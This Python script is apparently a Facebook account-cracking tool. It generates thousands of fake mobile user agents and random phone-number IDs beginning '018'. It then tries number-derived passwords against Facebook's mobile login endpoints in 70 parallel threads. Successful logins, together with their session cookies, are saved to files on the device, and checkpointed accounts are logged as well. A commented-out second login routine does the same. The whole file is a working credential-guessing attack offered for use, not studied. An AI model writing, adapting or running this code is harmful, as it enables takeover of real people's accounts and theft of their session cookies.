import re, sys, random, requests, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])




# ----------CK Update----------#

agent = "Mozilla/5.0 (Linux; Android 12; CPH2095 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36"
# -----GRAPH

# ---HOST

akun=[]
fb = "m"
ugen=[]
ugen2=[]
user = []
loop = 0
oks = []
cp= []
#user-agent-generate-random
for xd in range(5000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'SamsungBrowser'
    e = random.randrange(100, 9999)
    f = 'NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/537.36'
    uaku = (f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)

    aa = 'Mozilla/5.0 (Linux; Android 12'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' en-us; GT-'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 115)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(1000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'])
    c = 'RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(10, 200)
    e = '0'
    f = random.randrange(1000, 8000)
    g = random.randrange(10, 200)
    h = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2 = (f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(5000):
    a = 'Mozilla/5.0 (Symbian/55; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'NokiaX7-00'
    e = random.randrange(100, 9999)
    f = '/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/533.4'
    uaku = (f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android 8.1.0)'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' GT-S5830L'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    ugen.append(uak)

for agent in range(1000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = (f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
for x in range(1000):
    aa = 'Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
    c = 'ASUS_I006D Build/RKQ1.201022.002'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)

for xd in range(1000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'])
    c = 'RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d = random.randrange(10, 200)
    e = '0.4844.88 '
    f = random.randrange(1000, 8000)
    g = random.randrange(10, 200)
    h = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2 = (f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)

for xd in range(1000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'])
    c = 'CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(10, 200)
    e = '0'
    f = random.randrange(1000, 8000)
    g = random.randrange(10, 200)
    h = 'Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2 = (f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)

for xd in range(1000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'])
    c = 'RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(10, 200)
    e = '0'
    f = random.randrange(1000, 8000)
    g = random.randrange(10, 200)
    h = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2 = (f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(3000):
    a = 'Mozilla/5.0 (Symbian/55; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'NokiaX7-00'
    e = random.randrange(100, 9999)
    f = '/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/533.4'
    uaku = (f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android 8.1.0)'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' GT-S5830L'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    ugen.append(uak)

for agent in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = (f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
for x in range(10000):
    aa = 'Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
    c = 'ASUS_I006D Build/RKQ1.201022.002'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)

for agent in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = (f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)





def main():
    inp = input("How many you want to test")
    code = "018"
    for i in range(len(inp)):
        gg = str(random.choice(range(10000000, 99999999)))
        user.append(gg)
    with ThreadPool(max_workers=70) as update:

        for xd in user:
            uid = code + xd
            pwx = [xd, xd[2:]]
            update.submit(host, uid, pwx)


def host(uid, pwx):
    global oks, loop, fb
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[HERON]   {loop}⟩{str(len(user))} \x1b[38;5;155m{str(len(oks))}\r "),
    sys.stdout.flush()
    for ps in pwx:
        try:
            ses.headers.update({"Host": f'{fb}.facebook.com', "upgrade-insecure-requests": "1", "user-agent": ua2,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "same-origin",
                                "sec-fetch-mode": "cors", "sec-fetch-user": "empty", "sec-fetch-dest": "document",
                                "referer": f"https://{fb}.facebook.com/", "accept-encoding": "gzip, deflate br",
                                "accept-language": "en-GB,en-US,en-BD;q=0.9,en;q=0.8"})
            p = ses.get(
                f'https://{fb}.facebook.com/login/device-based/password/?uid=' + uid + '&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa = {"lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                     "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), "uid": uid,
                     "next": "https://p.facebook.com/login/save-device/", "flow": "login_no_pin", "pass": ps, }
            koki = (";").join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
            koki += ' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': f'{fb}.facebook.com', 'viewport-width': '980',
                     'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"',
                     'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                     'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1',
                     'user-agent': ua,
                     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                     'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1',
                     'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br',
                     'accept-language': 'en-US,en;q=0.9'}
            po = ses.post(f'https://{fb}.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa,
                          cookies={'cookie': koki}, headers=heade, allow_redirects=False)

            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[SHADID-Cp🌺]✅Uid┏━➤ {uid} 🔑Pass┏━➤{ps}')
                open("/sdcard/SHADID-Cp.txt", "a").write(uid + "|" + ps + "|"  "\n")
                akun.append(uid + ' • ' + ps)
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                oks += 1
                kuki = ";".join([key + "=" + value for key, value in ses.cookies.get_dict().items()])
                print(
                    f'\r\033[0;96m[SHADID-Ok🌸] ✅Uid┏━➤ {uid} 🔑Pass┏━➤ {ps}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
                open("/sdcard/SHADID-OK.txt", "a").write(uid + "|" + ps + "|" + kuki + "\n")
                break

            else:
                continue
        except ConnectionError:
            time.sleep(15)

    loop += 1





    #         free_fb = session.get(f'https://{fb}.facebook.com').text
    #         info = {"lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
    #                 "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    #                 "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
    #                 "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
    #                 "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
    #         uax = windows()
    #         had = {
    #             'Host': f'{fb}.facebook.com',
    #             'content-length': '1640',
    #             'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
    #             'sec-ch-ua-mobile': '?1',
    #             'user-agent': uax,
    #             'x-response-format': 'JSONStream',
    #             'content-type': 'application/x-www-form-urlencoded',
    #             'x-fb-lsd': 'AVreZWR72Tc',
    #             'viewport-width': '360',
    #             'sec-ch-ua-platform-version': '""',
    #             'x-requested-with': 'XMLHttpRequest',
    #             'x-asbd-id': '129477',
    #             'dpr': '2',
    #             'sec-ch-ua-full-version-list': '',
    #             'sec-ch-ua-model': '""',
    #             'sec-ch-prefers-color-scheme': 'light',
    #             'sec-ch-ua-platform': '"Android"',
    #             'accept': '*/*',
    #             'origin': f'https://{fb}.facebook.com',
    #             'sec-fetch-site': 'same-origin',
    #             'sec-fetch-mode': 'cors',
    #             'sec-fetch-dest': 'empty',
    #             'referer': f'https://{fb}.facebook.com/login/?wtsid=rdr_0e8HatvwFQ9PX3jwD&refsrc=deprecated&_rdr',
    #             'accept-encoding': 'gzip, deflate, br,',
    #             'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
    #         url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
    #         session.post(url=url, data=info, headers=had)
    #         heron_brand = session.cookies.get_dict().keys()
    #         if "c_user" in heron_brand:
    #             coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
    #             xx = coki.split("c_user=")[1]
    #             xd = xx[:15]
    #             print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
    #
    #             break
    #         elif "checkpoint" in heron_brand:
    #             break
    #             # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
    #         else:
    #             continue
    #     loop += 1
    # except Exception as e:
    #     time.sleep(30)


main()
